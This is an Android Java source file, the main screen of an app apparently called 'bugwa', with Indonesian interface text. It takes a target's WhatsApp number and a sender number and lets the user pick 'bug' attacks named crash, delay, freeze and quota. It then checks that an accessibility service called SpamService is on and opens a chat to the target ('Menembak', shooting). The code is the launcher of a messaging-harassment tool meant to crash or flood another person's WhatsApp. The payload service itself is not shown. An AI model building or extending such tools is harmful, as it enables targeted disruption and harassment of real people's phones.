package com.kaze.bugwa;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.VideoView;

public class MainActivity extends Activity {
    public static boolean isRunning = false;
    public static String targetNum = "";
    public static String senderNum = "";
    public static String bugType = "crash";
    private VideoView bannerVideo;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        bannerVideo = findViewById(R.id.bannerVideo);
        Uri videoUri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.bannerapk);
        bannerVideo.setVideoURI(videoUri);
        bannerVideo.setOnPreparedListener(mp -> {
            mp.setLooping(true);
            mp.setVolume(0, 0);
            bannerVideo.start();
        });

        final EditText etTarget = findViewById(R.id.targetNum);
        Button btnStart = findViewById(R.id.btnStart);
        final TextView terminal = findViewById(R.id.terminalLog);

        setupBugButtons();

        btnStart.setOnClickListener(v -> {
            targetNum = etTarget.getText().toString().trim();
            if(targetNum.startsWith("0")) targetNum = "62" + targetNum.substring(1);
            if(targetNum.isEmpty()) { 
                Toast.makeText(this, "Isi nomor target!", Toast.LENGTH_SHORT).show(); 
                return; 
            }
            if(!isAccessibilityEnabled()) {
                Toast.makeText(this, "Aktifkan Aksesibilitas dulu di Pengaturan HP!", Toast.LENGTH_LONG).show();
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            } else {
                SharedPreferences prefs = getSharedPreferences("kaze", MODE_PRIVATE);
                senderNum = prefs.getString("sender", "");
                if (senderNum.isEmpty()) {
                    showAddSenderDialog();
                } else {
                    launchWA();
                }
            }
        });
    }

    private void showAddSenderDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("ADD SENDER");
        builder.setMessage("Masukkan nomor WhatsApp Anda. Nomor akan didaftarkan secara lokal.");
        final EditText input = new EditText(this);
        input.setHint("Contoh: 628987654321");
        input.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
        builder.setView(input);
        builder.setPositiveButton("SIMPAN & TEMBAK", (dialog, which) -> {
            String num = input.getText().toString().trim();
            if(num.startsWith("0")) num = "62" + num.substring(1);
            if(!num.isEmpty()) {
                senderNum = num;
                getSharedPreferences("kaze", MODE_PRIVATE).edit().putString("sender", num).apply();
                launchWA();
            } else {
                Toast.makeText(this, "Nomor tidak boleh kosong!", Toast.LENGTH_SHORT).show();
            }
        });
        builder.setNegativeButton("BATAL", (dialog, which) -> dialog.cancel());
        builder.show();
    }

    private void launchWA() {
        isRunning = true;
        Toast.makeText(this, "Menembak dari " + senderNum, Toast.LENGTH_SHORT).show();
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/" + targetNum));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    private void setupBugButtons() {
        LinearLayout btnCrash = findViewById(R.id.btnBugCrash);
        LinearLayout btnDelay = findViewById(R.id.btnBugDelay);
        LinearLayout btnFreeze = findViewById(R.id.btnBugFreeze);
        LinearLayout btnQuota = findViewById(R.id.btnBugQuota);
        btnCrash.setOnClickListener(v -> { bugType = "crash"; resetButtons(btnCrash); });
        btnDelay.setOnClickListener(v -> { bugType = "delay"; resetButtons(btnDelay); });
        btnFreeze.setOnClickListener(v -> { bugType = "freeze"; resetButtons(btnFreeze); });
        btnQuota.setOnClickListener(v -> { bugType = "quota"; resetButtons(btnQuota); });
    }

    private void resetButtons(LinearLayout active) {
        LinearLayout[] btns = {findViewById(R.id.btnBugCrash), findViewById(R.id.btnBugDelay), findViewById(R.id.btnBugFreeze), findViewById(R.id.btnBugQuota)};
        for(LinearLayout b : btns) b.setBackgroundColor(0xFF110000);
        active.setBackgroundColor(0xFF330000);
    }

    private boolean isAccessibilityEnabled() {
        String service = getPackageName() + "/" + SpamService.class.getCanonicalName();
        try {
            String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(service);
        } catch (Exception e) { return false; }
    }
}
